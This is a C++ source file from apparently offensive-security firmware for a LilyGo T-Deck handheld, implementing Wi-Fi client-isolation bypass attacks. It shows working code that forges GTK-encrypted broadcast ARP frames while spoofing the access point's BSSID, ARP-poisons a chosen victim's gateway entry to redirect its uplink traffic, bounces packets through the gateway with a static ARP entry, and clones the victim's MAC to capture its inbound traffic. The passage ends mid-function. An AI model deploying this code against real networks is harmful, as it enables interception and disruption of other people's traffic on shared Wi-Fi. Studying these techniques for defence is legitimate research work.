// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// isoscan / is — ACTIVE client-isolation bypass attacks (AirSnitch Stage 2).
// See isoscan.h for the design; this file currently implements the VICTIM
// TARGETING layer (pick from the netspy list, confirm-before-fire, attack
// menu). The individual attack cores (GTK inject, port steal, RA DNS poison)
// are Stage-2 HW-gated work and are stubbed until each is built + verified.
//
// Technique reference (NO code used — reimplemented from published research):
//   AirSnitch, Mathy Vanhoef et al., NDSS 2026.
//   https://github.com/vanhoefm/airsnitch  (all-rights-reserved → techniques only)

#include "isoscan.h"
#include <Arduino.h>
#include <WiFi.h>
#include <string.h>
#include <strings.h>               // strcasecmp
#include <ctype.h>                 // isdigit
#include <stdlib.h>                // atoi, strtok
#include "esp_wifi.h"
#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "netspy.h"                 // victim list: count / ip / mac / name; live GTK
#include "iso_ccmp.h"              // software CCMP encrypt + self-test
#include <lwip/etharp.h>           // read the victim's reply straight from our ARP cache
#include <lwip/netif.h>
#include <lwip/tcpip.h>            // LOCK_TCPIP_CORE
#include <ESP32Ping.h>            // bounce: reach the victim via the gateway at IP layer

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

// ── attacks ────────────────────────────────────────────────────────────────────
enum IsoAttack {
    ISO_NONE = 0,
    ISO_INJECT,     // BUILT: GTK-encrypt a broadcast ARP → reachability probe
    ISO_BOUNCE,     // stub: reach the victim at IP layer via the gateway MAC
    ISO_BCAST,      // stub: to-DS broadcast w/ victim IP → prove inject viability
    ISO_PORTDOWN,   // stub: steal victim's incoming traffic (spoof victim MAC)
    ISO_PORTUP,     // BUILT: gateway ARP-poison → redirect victim's uplink to us
    ISO_AUTO        // stub: run all, report which succeed
};

struct IsoAttackInfo { IsoAttack id; const char* key; const char* label; const char* desc; };
static const IsoAttackInfo ISO_ATTACKS[] = {
    { ISO_INJECT,   "inject",   "Inject (GTK broadcast ARP)", "GTK-encrypt broadcast ARP → reachability probe" },
    { ISO_BOUNCE,   "bounce",   "Gateway bounce",         "Reach victim via gateway MAC (IP layer)" },
    { ISO_BCAST,    "bcast",    "Broadcast probe",        "to-DS broadcast w/ victim IP → viability test" },
    { ISO_PORTDOWN, "portdown", "Port steal (inbound)",   "Spoof victim MAC → steal incoming traffic" },
    { ISO_PORTUP,   "portup",   "Gateway poison (uplink)", "ARP-poison victim's gateway -> redirect traffic to us" },
    { ISO_AUTO,     "auto",     "Auto (run all)",         "Try every attack, report what works" },
};
static const int ISO_ATTACK_N = (int)(sizeof(ISO_ATTACKS) / sizeof(ISO_ATTACKS[0]));

static IsoAttack isoAttackFromKey(const char* s) {
    for (int i = 0; i < ISO_ATTACK_N; i++)
        if (!strcasecmp(s, ISO_ATTACKS[i].key)) return ISO_ATTACKS[i].id;
    return ISO_NONE;
}
static const IsoAttackInfo* isoAttackInfo(IsoAttack a) {
    for (int i = 0; i < ISO_ATTACK_N; i++) if (ISO_ATTACKS[i].id == a) return &ISO_ATTACKS[i];
    return nullptr;
}

// ── header (RED accent — this command TRANSMITS) ────────────────────────────────
static void isoHeader(const char* tag) {
    auto& dm = displayManager;
    dm.clearScreen(); dm.updateStatusBar(); dm.setDefaultTextSize();
    dm.setCursor(6, outputY);
    dm.setTextColor(0x7BEF);     dm.printText("[");
    dm.setTextColor(TFT_RED);    dm.printText("ISO");
    dm.setTextColor(0x7BEF);     dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("SCAN");
    dm.setTextColor(0x7BEF);     dm.printText("]  "); dm.println(tag);
    dm.printSeparator();
}

static void isoIpStr(uint32_t ip, char* b, int n) {
    snprintf(b, n, "%u.%u.%u.%u", (unsigned)((ip >> 24) & 0xff), (unsigned)((ip >> 16) & 0xff),
             (unsigned)((ip >> 8) & 0xff), (unsigned)(ip & 0xff));
}
static void isoMacStr(const uint8_t* m, char* b, int n) {
    snprintf(b, n, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

// ── victim picker (over the netspy device list) ─────────────────────────────────
#define ISO_ROWS 9
static void isoPickDraw(int page, int sel) {
    auto& dm = displayManager;
    isoHeader("pick a victim");
    int devN = netspyDeviceCount();
    dm.setTextColor(0x7BEF);
    dm.setCursor(4,   outputY + LINE_HEIGHT * 2); dm.printText("#");
    dm.setCursor(26,  outputY + LINE_HEIGHT * 2); dm.printText("IP");
    dm.setCursor(122, outputY + LINE_HEIGHT * 2); dm.printText("NAME / VENDOR");
    int total = (devN + ISO_ROWS - 1) / ISO_ROWS; if (total < 1) total = 1;
    if (page >= total) page = total - 1;
    for (int r = 0; r < ISO_ROWS; r++) {
        int idx = page * ISO_ROWS + r;
        int y = outputY + LINE_HEIGHT * (3 + r);
        if (idx >= devN) continue;
        bool s = (r == sel);
        if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
        char nb[4]; snprintf(nb, sizeof(nb), "%d", idx);
        dm.setCursor(4, y); dm.setTextColor(s ? TFT_YELLOW : TFT_DARKGREY); dm.printText(nb);
        char ipb[16]; isoIpStr(netspyDeviceIp(idx), ipb, sizeof(ipb));
        dm.setCursor(26, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE); dm.printText(ipb);
        const char* who = netspyDeviceName(idx); if (!who) who = "?";
        char wb[20]; snprintf(wb, sizeof(wb), "%.18s", who);
        dm.setCursor(122, y); dm.setTextColor(s ? TFT_YELLOW : TFT_CYAN); dm.printText(wb);
    }
    char foot[64];
    snprintf(foot, sizeof(foot), "dev:%d pg%d/%d  trkbl=sel ent=pick a/l=page q", devN, page + 1, total);
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText(foot);
}

// Returns a netspy device index, or -1 if cancelled.
static int isoPickVictim() {
    auto& dm = displayManager;
    int page = 0, sel = 0; uint32_t lastDraw = 0;
    while (true) {
        char k = inputHandler.getKeyboardInput();
        TrackballEvent tb = inputHandler.getTrackballEvent();
        int devN = netspyDeviceCount();
        int pageCount = devN - page * ISO_ROWS; if (pageCount > ISO_ROWS) pageCount = ISO_ROWS;

        if (k == 'q' || k == 'Q') return -1;
        else if (k == 'l' || k == 'L') { page++; sel = 0; lastDraw = 0; }
        else if (k == 'a' || k == 'A') { if (page > 0) { page--; sel = 0; } lastDraw = 0; }
        else if ((k == '\r' || k == '\n') && pageCount > 0) return page * ISO_ROWS + sel;
        else if (tb == TBALL_CLICK && pageCount > 0)        return page * ISO_ROWS + sel;
        else if (tb == TBALL_DOWN) { if (sel < pageCount - 1) { sel++; lastDraw = 0; } }
        else if (tb == TBALL_UP)   { if (sel > 0)             { sel--; lastDraw = 0; } }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 500) { isoPickDraw(page, sel); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── attack menu (when no attack was given on the CLI) ────────────────────────────
static void isoMenuDraw(int idx, int sel) {
    auto& dm = displayManager;
    isoHeader("choose attack");
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("target:");
    const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
    dm.setTextColor(TFT_CYAN); dm.setCursor(58, outputY + LINE_HEIGHT * 2); dm.printText(nm);
    for (int i = 0; i < ISO_ATTACK_N; i++) {
        int y = outputY + LINE_HEIGHT * (4 + i);
        bool s = (i == sel);
        if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
        dm.setCursor(10, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE);
        dm.printText(ISO_ATTACKS[i].label);
    }
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
    dm.printText("trkbl=sel  ent=run  q=cancel");
}

// Returns the chosen attack, or ISO_NONE if cancelled.
static IsoAttack isoAttackMenu(int idx) {
    auto& dm = displayManager;
    int sel = 0; uint32_t lastDraw = 0;
    while (true) {
        char k = inputHandler.getKeyboardInput();
        TrackballEvent tb = inputHandler.getTrackballEvent();
        if (k == 'q' || k == 'Q') return ISO_NONE;
        else if ((k == '\r' || k == '\n') || tb == TBALL_CLICK) return ISO_ATTACKS[sel].id;
        else if (tb == TBALL_DOWN) { if (sel < ISO_ATTACK_N - 1) { sel++; lastDraw = 0; } }
        else if (tb == TBALL_UP)   { if (sel > 0)                { sel--; lastDraw = 0; } }
        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 500) { isoMenuDraw(idx, sel); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── confirm-before-fire ─────────────────────────────────────────────────────────
// isoscan TRANSMITS at the victim, so echo exactly who is about to be hit and
// require an explicit 'y'. A fat-fingered index must not attack the wrong device.
static bool isoConfirm(int idx, IsoAttack attack) {
    auto& dm = displayManager;
    uint8_t mac[6]; bool ok = netspyDeviceMac(idx, mac);
    const IsoAttackInfo* ai = isoAttackInfo(attack);
    auto draw = [&]() {
        if (dm.isBlocked()) return;
        isoHeader("CONFIRM ATTACK");
        int y = outputY + LINE_HEIGHT * 2;
        char b[48];
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("attack");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(ai ? ai->label : "?");
        y += LINE_HEIGHT;
        dm.setTextColor(0x7BEF); dm.setCursor(72, y); dm.printText(ai ? ai->desc : ""); y += LINE_HEIGHT + 4;
        const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("name");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(nm); y += LINE_HEIGHT;
        isoIpStr(netspyDeviceIp(idx), b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("IP");
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT;
        isoMacStr(mac, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("MAC");
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 6;
        dm.setTextColor(TFT_RED);      dm.setCursor(6, y);
        dm.printText("This TRANSMITS at the target.");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
        dm.printText("[y] fire   [n]/[q] cancel");
    };
    if (!ok) return false;
    draw();
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'y' || k == 'Y') return true;
        if (k == 'n' || k == 'N' || k == 'q' || k == 'Q') return false;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) draw();
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── inject transmit primitive (shared by all GTK-inject payloads) ───────────────
// Build a broadcast FromDS data header: Data + FromDS + Protected; A1 = broadcast,
// A2 = BSSID (spoof the AP), A3 = source. seq goes in SeqCtrl (masked out of AAD).
static void isoBuildHdr(const uint8_t bssid[6], const uint8_t src[6], uint16_t seq, uint8_t hdr[24]) {
    hdr[0] = 0x08; hdr[1] = 0x42;                    // Data, FromDS, Protected
    hdr[2] = 0x00; hdr[3] = 0x00;                    // duration
    memset(hdr + 4, 0xff, 6);                        // A1 = broadcast
    memcpy(hdr + 10, bssid, 6);                      // A2 = BSSID (spoofed)
    memcpy(hdr + 16, src, 6);                        // A3 = original source
    uint16_t sc = (uint16_t)((seq & 0x0fff) << 4);   // seq number, fragment 0
    hdr[22] = (uint8_t)(sc & 0xff); hdr[23] = (uint8_t)(sc >> 8);
}

// LLC/SNAP + ARP request ("who-has victimIp, tell srcIp/srcMac"). Returns length.
static int isoBuildArp(const uint8_t srcMac[6], uint32_t srcIp, uint32_t dstIp, uint8_t* p) {
    static const uint8_t snap[8] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06 };
    memcpy(p, snap, 8);
    uint8_t* a = p + 8;
    a[0] = 0x00; a[1] = 0x01;                         // HW type: Ethernet
    a[2] = 0x08; a[3] = 0x00;                         // proto: IPv4
    a[4] = 0x06; a[5] = 0x04;                         // hlen 6, plen 4
    a[6] = 0x00; a[7] = 0x01;                         // opcode: request
    memcpy(a + 8, srcMac, 6);                         // sender MAC
    a[14] = (srcIp >> 24) & 0xff; a[15] = (srcIp >> 16) & 0xff;
    a[16] = (srcIp >> 8) & 0xff;  a[17] = srcIp & 0xff;
    memset(a + 18, 0x00, 6);                          // target MAC unknown
    a[24] = (dstIp >> 24) & 0xff; a[25] = (dstIp >> 16) & 0xff;
    a[26] = (dstIp >> 8) & 0xff;  a[27] = dstIp & 0xff;
    return 8 + 28;
}

// Note: no promiscuous RX here. The victim's ARP reply is UNICAST to us, so it
// flows through the normal STA data path into lwip (not the promiscuous cb, which
// only gets group frames decrypted). We detect it by reading our own ARP cache —
// and enabling promiscuous would risk diverting that reply away from lwip.

// First real inject: GTK-encrypted broadcast ARP at the victim (plan "inject arp",
// reachability probe). Also the diagnostic for the big unknown — will
// esp_wifi_80211_tx accept a frame whose A2 is the spoofed BSSID while we're
// associated? The live TX ok/err counters answer that on the first flash.
static void isoInjectArp(int idx) {
    auto& dm = displayManager;
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        isoHeader("inject");
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort.");
        dm.setTextColor(0x7BEF);  dm.println("(run 'is cctest' to check)");
        dm.printCommandScreen(); return;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { isoHeader("inject"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress lip = WiFi.localIP();
    uint32_t myIp = ((uint32_t)lip[0] << 24) | ((uint32_t)lip[1] << 16) | ((uint32_t)lip[2] << 8) | lip[3];
    uint32_t victimIp = netspyDeviceIp(idx);

    uint64_t pn = 0x800000000000ULL;                 // start high to beat AP group PN
    uint8_t  keyid = 1;                              // GTK key id — tunable ([k] toggles 1/2)
    uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0;
    uint32_t lastTx = 0, lastDraw = 0, lastArp = 0;
    esp_err_t lastRc = ESP_OK;
    bool arpHit = false; uint8_t arpMac[6] = { 0 };  // victim reply seen in OUR ARP cache

    auto draw = [&]() {
        if (dm.isBlocked()) return;
        isoHeader("inject: ARP (GTK)");
        int y = outputY + LINE_HEIGHT * 2; char b[48];
        const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("target");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(nm); y += LINE_HEIGHT;
        isoIpStr(victimIp, b, sizeof(b));
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
        snprintf(b, sizeof(b), "keyid %u", keyid);
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("params");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
        snprintf(b, sizeof(b), "TX ok : %lu", (unsigned long)txOk);
        dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
        snprintf(b, sizeof(b), "TX err: %lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b);
        y += LINE_HEIGHT + 4;
        // victim reply = inject reached the target. The unicast reply is delivered
        // to our IP stack, so we read it straight from our own ARP cache.
        if (arpHit) {
            dm.setTextColor(TFT_GREEN); dm.setCursor(6, y);
            dm.printText("VICTIM REPLIED - reachable!"); y += LINE_HEIGHT;
            snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x  (ARP cache)",
                     arpMac[0], arpMac[1], arpMac[2], arpMac[3], arpMac[4], arpMac[5]);
            dm.setTextColor(TFT_GREEN); dm.setCursor(6, y); dm.printText(b);
        } else {
            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);
            dm.printText("no reply yet (waiting...)");
        }
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
        dm.printText("[k] keyid 1/2   [q] stop");
    };
    draw();

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }

        if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
            lastTx = millis();
            uint8_t pnb[6]; for (int i = 0; i < 6; i++) pnb[i] = (uint8_t)((pn >> (8 * i)) & 0xff);
            uint8_t hdr[24]; isoBuildHdr(bssid, src, seq++, hdr);
            uint8_t plain[64]; int plen = isoBuildArp(src, myIp, victimIp, plain);
            uint8_t enc[96];
            int elen = isoCcmpEncrypt(gtk, 16, hdr, keyid, pnb, plain, plen, enc, sizeof(enc));
            if (elen > 0) {
                uint8_t frame[128];
                memcpy(frame, hdr, 24);
                memcpy(frame + 24, enc, elen);
                lastRc = esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false);
                if (lastRc == ESP_OK) txOk++; else txErr++;
                pn++;
            } else { txErr++; }
            lastDraw = 0;
        }

        // Resolve the victim via our own IP stack (netdiscover's proven pattern:
        // etharp_request primes a pending entry, then etharp_find_addr reads it
        // once a reply completes it). A hit = the victim is reachable at the IP
        // layer. On an ISOLATED net a normal ARP can't reach it, so a hit means
        // our injected broadcast is what got through; on a NON-isolated net the
        // stack can resolve it anyway (so it just confirms the detector works).
        if (!arpHit && netif_default && millis() - lastArp >= 500) {
            lastArp = millis();
            ip4_addr_t vt;
            IP4_ADDR(&vt, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                     (victimIp >> 8) & 0xff, victimIp & 0xff);
            struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
            LOCK_TCPIP_CORE();
            etharp_request(netif_default, &vt);
            s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
            UNLOCK_TCPIP_CORE();
            if (hit >= 0 && er) { arpHit = true; memcpy(arpMac, er->addr, 6); lastDraw = 0; }
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 300) { draw(); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    dm.clearScreen(); dm.printCommandScreen();
}

// ── gateway ARP-poison (uplink MITM + isolation-delivery test) ───────────────────
// Inject a sustained GTK-encrypted ARP advertising the GATEWAY's IP as coming from
// our MAC ("who-has victim tell gateway<-ourMAC"): the victim caches gateway->us and
// starts sending its upstream traffic to the T-Deck. On this isolated hotspot this
// is also THE delivery test — if the victim's internet redirects/stalls, then
// victim->T-Deck delivery works and traffic-interception attacks (RA DNS poison,
// MITM) are viable; if the victim keeps browsing normally, isolation is dropping it.
static void isoGwPoison(int idx) {
    auto& dm = displayManager;
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        isoHeader("gw poison");
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress gw = WiFi.gatewayIP();
    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!gwIp) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return; }

    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0, lastTx = 0, lastDraw = 0; esp_err_t lastRc = ESP_OK;

    auto draw = [&]() {
        if (dm.isBlocked()) return;
        isoHeader("gateway poison");
        int y = outputY + LINE_HEIGHT * 2; char b[48];
        isoIpStr(gwIp, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("gateway");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT;
        isoIpStr(victimIp, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("victim");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
        snprintf(b, sizeof(b), "keyid %u   TX ok %lu", keyid, (unsigned long)txOk);
        dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
        snprintf(b, sizeof(b), "TX err %lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
        dm.setTextColor(0x7BEF); dm.setCursor(6, y); dm.printText("victim gateway -> this device."); y += LINE_HEIGHT;
        dm.setTextColor(0x7BEF); dm.setCursor(6, y); dm.printText("watch its internet: drop = works.");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid 1/2   [q] stop");
    };
    draw();
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }
        if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
            lastTx = millis();
            uint8_t pnb[6]; for (int i = 0; i < 6; i++) pnb[i] = (uint8_t)((pn >> (8 * i)) & 0xff);
            uint8_t hdr[24]; isoBuildHdr(bssid, src, seq++, hdr);
            uint8_t plain[64]; int plen = isoBuildArp(src, gwIp, victimIp, plain);  // sender IP = gateway
            uint8_t enc[96];
            int elen = isoCcmpEncrypt(gtk, 16, hdr, keyid, pnb, plain, plen, enc, sizeof(enc));
            if (elen > 0) {
                uint8_t frame[128]; memcpy(frame, hdr, 24); memcpy(frame + 24, enc, elen);
                lastRc = esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false);
                if (lastRc == ESP_OK) txOk++; else txErr++;
                pn++;
            } else { txErr++; }
            lastDraw = 0;
        }
        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 300) { draw(); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    dm.clearScreen(); dm.printCommandScreen();
}

// portdown capture: count data frames whose A1 (dest) == the cloned victim MAC —
// traffic the AP now hands us because we stole the victim's MAC.
static volatile bool     s_victimSteal = false;
static volatile uint32_t s_stealCount  = 0;
static volatile uint8_t  s_stealMac[6];
static void isoStealCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_victimSteal || t != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
    if (pk->rx_ctrl.sig_len < 24) return;
    const uint8_t* f = pk->payload;
    uint16_t fc = f[0] | (f[1] << 8);
    if (!((fc >> 9) & 1)) return;                    // FromDS → A1 = destination
    if (memcmp(f + 4, (const void*)s_stealMac, 6) == 0) s_stealCount++;
}

// ── gateway MAC resolver (bounce needs it; the gateway is reachable even under
// isolation, so lwip can ARP it normally). Returns true + fills mac, or false.
static bool isoResolveGw(uint32_t gwIp, struct eth_addr* mac) {
    if (!netif_default || !gwIp) return false;
    ip4_addr_t g; IP4_ADDR(&g, (gwIp >> 24) & 0xff, (gwIp >> 16) & 0xff, (gwIp >> 8) & 0xff, gwIp & 0xff);
    for (int t = 0; t < 25; t++) {                   // ~2.5s
        struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
        LOCK_TCPIP_CORE();
        etharp_request(netif_default, &g);
        s8_t hit = etharp_find_addr(netif_default, &g, &er, &ir);
        UNLOCK_TCPIP_CORE();
        if (hit >= 0 && er) { *mac = *er; return true; }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') return false;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return false;
}

// ── bounce — reach the victim at the IP layer via the gateway ────────────────────
// Client isolation blocks client↔client at L2, but the gateway routes at L3. We
// install a static ARP entry (victim IP → gateway MAC) so lwip sends the victim's
// packets to the gateway, which may hairpin them to the victim. A ping reply =>
// reachable despite isolation. Static entry removed on every exit.
static void isoBounce(int idx) {
    auto& dm = displayManager;
    isoHeader("gateway bounce");
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!victimIp) { dm.setTextColor(TFT_RED); dm.println("Victim has no IP."); dm.printCommandScreen(); return; }
    IPAddress gw = WiFi.gatewayIP();
    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
    if (!gwIp) { dm.setTextColor(TFT_RED); dm.println("No gateway."); dm.printCommandScreen(); return; }

    char b[48];
    dm.setTextColor(0x7BEF); dm.println("Resolving gateway MAC...");
    struct eth_addr gwMac;
    if (!isoResolveGw(gwIp, &gwMac)) {
        dm.setTextColor(TFT_RED); dm.println("Can't resolve gateway MAC."); dm.printCommandScreen(); return;
    }
    ip4_addr_t vip; IP4_ADDR(&vip, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                            (victimIp >> 8) & 0xff, victimIp & 0xff);
    LOCK_TCPIP_CORE(); etharp_add_static_entry(&vip, &gwMac); UNLOCK_TCPIP_CORE();

    IPAddress vAddr((uint8_t)((victimIp >> 24) & 0xff), (uint8_t)((victimIp >> 16) & 0xff),
                    (uint8_t)((victimIp >> 8) & 0xff), (uint8_t)(victimIp & 0xff));
    isoIpStr(victimIp, b, sizeof(b));
    dm.setTextColor(0x7BEF); dm.printText("Pinging "); dm.printText(b); dm.println(" via gw...");
    bool ok = Ping.ping(vAddr, 4);                   // blocks ~4s
    float ms = ok ? Ping.averageTime() : 0.0f;

    LOCK_TCPIP_CORE(); etharp_remove_static_entry(&vip); UNLOCK_TCPIP_CORE();

    dm.println("");
    if (ok) {
        dm.setTextColor(TFT_GREEN);
        snprintf(b, sizeof(b), "BOUNCE OK - reply %.0f ms", ms); dm.println(b);
        dm.setTextColor(0x6FE8); dm.println("Isolation bypassed at IP layer.");
    } else {
        dm.setTextColor(TFT_RED); dm.println("No reply - bounce blocked");
        dm.setTextColor(0x7BEF); dm.println("(gateway won't hairpin, or victim");
        dm.println(" drops ICMP)");
    }
    dm.printCommandScreen();
}

// ── portdown — MAC-spoof to steal the victim's INBOUND traffic (downlink) ────────
// Clone the victim's MAC so the AP's forwarding table maps that MAC to our radio
// and hands us its incoming frames. DISRUPTIVE: MAC conflict with the real victim,
// and it drops+reconnects our own WiFi (esp_wifi_set_mac needs the IF stopped,
// per mac_changer). The original MAC is restored on EVERY exit path (plan's rule).
static void isoSetStaMac(const uint8_t* mac) {         // mirrors MacChanger::applyMac
    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
    esp_wifi_stop();
    esp_wifi_set_mac(WIFI_IF_STA, (uint8_t*)mac);
    esp_wifi_start();
    delay(300);
}
static void isoPortDown(int idx) {
    auto& dm = displayManager;
    isoHeader("port steal: downlink");
    uint8_t vic[6];
    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return; }
    uint8_t orig[6]; esp_wifi_get_mac(WIFI_IF_STA, orig);

    char b[48];
    isoMacStr(vic, b, sizeof(b));
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("clone MAC");
    dm.setTextColor(TFT_CYAN);     dm.setCursor(72, outputY + LINE_HEIGHT * 2); dm.printText(b);
    dm.setTextColor(TFT_RED);      dm.setCursor(6, outputY + LINE_HEIGHT * 4);
    dm.printText("Reconnecting as the victim...");
    dm.setTextColor(0x7BEF);       dm.setCursor(6, outputY + LINE_HEIGHT * 6);
    dm.printText("Its inbound traffic should now");
    dm.setCursor(6, outputY + LINE_HEIGHT * 7); dm.printText("route to us (MAC conflict).");
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] stop + restore MAC");

    isoSetStaMac(vic);                               // become the victim
    WiFi.reconnect();

    // Hold the spoof, promiscuous-sniff frames now addressed to the victim MAC.
    uint32_t rx = 0, lastDraw = 0;
    s_victimSteal = true; s_stealCount = 0; memcpy((void*)s_stealMac, vic, 6);
    wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(isoStealCb);
    esp_wifi_set_promiscuous(true);
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        rx = s_stealCount;
        if (!dm.isBlocked() && millis() - lastDraw >= 500) {
